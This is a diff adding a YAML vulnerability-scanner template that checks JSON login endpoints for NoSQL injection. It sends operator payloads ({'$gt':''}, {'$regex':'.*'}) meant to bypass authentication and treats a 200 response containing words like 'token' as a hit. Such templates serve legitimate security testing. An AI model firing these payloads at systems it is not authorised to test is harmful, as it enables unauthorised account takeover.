@@ -1,0 +1,57 @@
+id: hunt3r-nosql-injection
+
+info:
+  name: NoSQL Injection Detection
+  author: hunt3r
+  severity: high
+  description: Detects NoSQL injection in JSON APIs via operator injection ($gt, $where, $regex).
+  tags: nosql,injection,mongodb,hunt3r
+  reference:
+    - https://portswigger.net/web-security/nosql-injection
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/api/auth"
+      - "{{BaseURL}}/api/v1/login"
+
+    body: '{"email":{"$gt":""},"password":{"$gt":""}}'
+    headers:
+      Content-Type: "application/json"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "token"
+          - "authentication"
+          - "success"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/rest/user/login"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/api/login"
+
+    body: '{"email":{"$regex":".*"},"password":{"$regex":".*"}}'
+    headers:
+      Content-Type: "application/json"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "token"
+          - "authentication"
